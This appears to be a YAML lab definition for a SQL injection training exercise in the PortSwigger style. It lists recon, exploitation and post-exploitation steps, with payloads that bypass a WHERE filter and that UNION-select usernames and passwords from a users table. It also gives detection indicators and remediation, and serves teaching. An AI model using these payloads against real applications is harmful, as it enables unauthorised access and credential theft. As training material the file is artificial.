@@ -1,0 +1,99 @@
+# Category: SQL Injection
+name: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
+id: "sql-injection-where-hidden-001"
+category: "sql_injection"
+subcategory: "where_clause"
+difficulty: "apprentice"
+estimated_time: "30 minutes"
+
+description: |
+  This lab contains a SQL injection vulnerability in the product category filter.
+  When the user selects a category, the application performs a SQL query like:
+  `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
+  The `released = 1` condition hides products that are not yet released.
+  By injecting a payload into the category parameter, an attacker can bypass
+  the `released = 1` filter and retrieve all products, including unreleased ones.
+
+learning_objectives:
+  - Understand basic SQL injection in WHERE clauses
+  - Use UNION attacks to retrieve hidden data
+  - Bypass application-level filters
+
+tools:
+  - Burp Suite
+  - curl
+  - sqlmap (optional)
+
+prerequisites:
+  - Basic understanding of SQL syntax
+  - Access to the lab environment
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify the vulnerable parameter"
+    commands:
+      - "# Browse to the lab and select a category"
+      - "# Observe the URL: https://lab-id.web-security-academy.net/filter?category=Gifts"
+      - "# Intercept the request in Burp Suite"
+    expected_output: "The category parameter is used in a SQL query"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Inject SQL payload to bypass the released filter"
+    commands:
+      - "# Modify the category parameter"
+      - "category=Gifts' OR 1=1--"
+      - "# Or use: category=Gifts' OR 1=1--"
+      - "# Send the request"
+    expected_output: "All products are displayed, including unreleased ones"
+    detection: "Web server logs may show unusual SQL queries"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Retrieve additional data from the database"
+    commands:
+      - "# Use UNION SELECT to extract data from other tables"
+      - "category=Gifts' UNION SELECT username, password FROM users--"
+    expected_output: "Credentials or other sensitive data"
+    detection: "Database logs may show unusual queries"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "SQL keywords in URL parameters"
+  log_indicators:
+    - "Database error messages"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Use parameterized queries (prepared statements)"
+    - "Sanitize user input"
+  long_term:
+    - "Implement input validation and allowlisting"
+    - "Use an ORM that automatically escapes input"
+
+variables:
+  lab_url: "https://lab-id.web-security-academy.net"
+  category_param: "category"
+
+assessment_questions:
+  - "What does the `--` comment do in SQL?"
+  - "Why does `OR 1=1` bypass the `released = 1` filter?"
+  - "What is the difference between UNION and UNION ALL?"
+
+references:
+  - url: "https://portswigger.net/web-security/sql-injection"
+    title: "PortSwigger SQL Injection"
+  - url: "https://owasp.org/www-community/attacks/SQL_Injection"
+    title: "OWASP SQL Injection"
